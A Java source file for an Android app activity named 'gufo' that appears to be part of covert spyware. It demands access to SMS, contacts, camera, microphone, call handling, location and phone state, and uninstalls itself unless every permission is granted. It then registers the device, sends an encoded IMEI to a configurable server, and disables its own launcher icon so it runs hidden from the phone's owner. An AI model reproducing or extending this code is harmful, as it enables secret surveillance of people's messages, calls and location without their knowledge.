package com.lacerbo.gufo;

import android.Manifest;
import android.annotation.TargetApi;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class Central extends Activity {

    private Boolean booFalhaInstalacao = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_central);

        if (Build.VERSION.SDK_INT >= 23) {

            List<String> lisStrPermissao = new ArrayList<>();

            if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                lisStrPermissao.add(Manifest.permission.ACCESS_FINE_LOCATION);
            }
            if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                lisStrPermissao.add(Manifest.permission.ACCESS_COARSE_LOCATION);
            }
            if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                lisStrPermissao.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            }
            if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                lisStrPermissao.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            }
            if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.BODY_SENSORS) != PackageManager.PERMISSION_GRANTED) {
                lisStrPermissao.add(Manifest.permission.BODY_SENSORS);
            }
            if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                lisStrPermissao.add(Manifest.permission.READ_CONTACTS);
            }
            if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                lisStrPermissao.add(Manifest.permission.CAMERA);
            }
            if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                lisStrPermissao.add(Manifest.permission.RECORD_AUDIO);
            }
            if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                lisStrPermissao.add(Manifest.permission.READ_PHONE_STATE);
            }
            if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED) {
                lisStrPermissao.add(Manifest.permission.PROCESS_OUTGOING_CALLS);
            }
            if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
                lisStrPermissao.add(Manifest.permission.RECEIVE_SMS);
            }
            if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                lisStrPermissao.add(Manifest.permission.READ_SMS);
            }

            if (lisStrPermissao.isEmpty()) {
                chamaSite();
            } else {
                String[] strPermissao = new String[lisStrPermissao.size()];
                strPermissao = lisStrPermissao.toArray(strPermissao);
                ActivityCompat.requestPermissions(this, strPermissao, 0);
            }

        } else {
            chamaSite();
        }

    }

    private void chamaSite() {

        Propriedades mPropriedades = new Propriedades(getApplicationContext());

        if (mPropriedades.pegarBooleanPropriedades("PI_booCadastroSite")) {
            EnviarDados mEnviaDados = new EnviarDados();
            mEnviaDados.getInstance(getApplicationContext(), "C", "Cadastro", "");
            mPropriedades.salvarPropriedades("PI_booCadastroSite", false);
        }

        if (mPropriedades.pegarBooleanPropriedades("PI_booSomCoruja")) {
            MediaPlayer[] mpCoruja;
            mpCoruja = new MediaPlayer[1];
            mpCoruja[0] = MediaPlayer.create(getApplicationContext(), R.raw.coruja);
            mpCoruja[0].setVolume(1.0f, 1.0f);
            mpCoruja[0].start();
        }

        String strServidor = "http://" + mPropriedades.pegarStringPropriedades("PI_strURLServidor") + "/dados.php?";
        InfoTelefone mInfoTelefone = new InfoTelefone();
        mInfoTelefone.getInstance(getApplicationContext());
        String strImeiSIM1 = mInfoTelefone.getImeiSIM1();
        String strValor1 = strImeiSIM1.substring(0,8) + mInfoTelefone.getHora();
        String strValor2 = "3" + strImeiSIM1.substring(8) + mInfoTelefone.getHora();

        strImeiSIM1 = "dados=" + geraChaveAceSite(strValor2) +"-"+ geraChaveAceSite(strValor1); // +"---"+ strValor1 +"-"+ strValor2;

        WebView wvIudoo = findViewById(R.id.webView);
        wvIudoo.getSettings().setJavaScriptEnabled(true);
        wvIudoo.getSettings().setSupportZoom(false);
        wvIudoo.setWebViewClient(new WebViewClient());
        wvIudoo.loadUrl(strServidor + strImeiSIM1);

    }

    private String geraChaveAceSite(String strChave) {
        int resto;
        long cociente = Long.parseLong(strChave);
        String retorno = "";
        String sequencia = "AaBb0CcDdE1eFfGg2HhIiJ3jKkLl4MmNn5OoPpQ6qRrSs7TtUuV8vWwXx9YyZz";
        while (cociente > 62) {
            resto = (int) (cociente % 62);
            retorno += sequencia.substring(resto, resto+1);
            cociente = (cociente / 62);
        }
        resto = (int)cociente;
        retorno += sequencia.substring(resto, resto+1);

        return retorno;
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP_MR1)
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String permissions[], @NonNull int[] grantResults) {
        Boolean booChamaSite = true;
        if (requestCode == 0) {
            if (grantResults.length > 0) {
                for (int i : grantResults) {
                    if (i == -1) {
                        booChamaSite = false;
                        break;
                    }
                }
            } else {
                booChamaSite = false;
            }
        } else {
            booChamaSite = false;
        }

        if (booChamaSite) {
            chamaSite();
        } else {
            booFalhaInstalacao = true;
            Toast mensag = Toast.makeText(this, "Falha nas permissões. Reinstale permitindo todos os acessos.", Toast.LENGTH_LONG);
            mensag.show();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (booFalhaInstalacao) {
            Uri packageUri = Uri.parse("package:com.lacerbo.gufo");
            Intent uninstallIntent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE, packageUri);
            startActivity(uninstallIntent);
        } else {
//            Toast.makeText(this, "Aguarde! Analisando configurações... ", Toast.LENGTH_LONG).show();
//            Toast.makeText(this, "gufo pronto e em execução! ", Toast.LENGTH_LONG).show();

            PackageManager p = getPackageManager();
            p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        }
    }

}
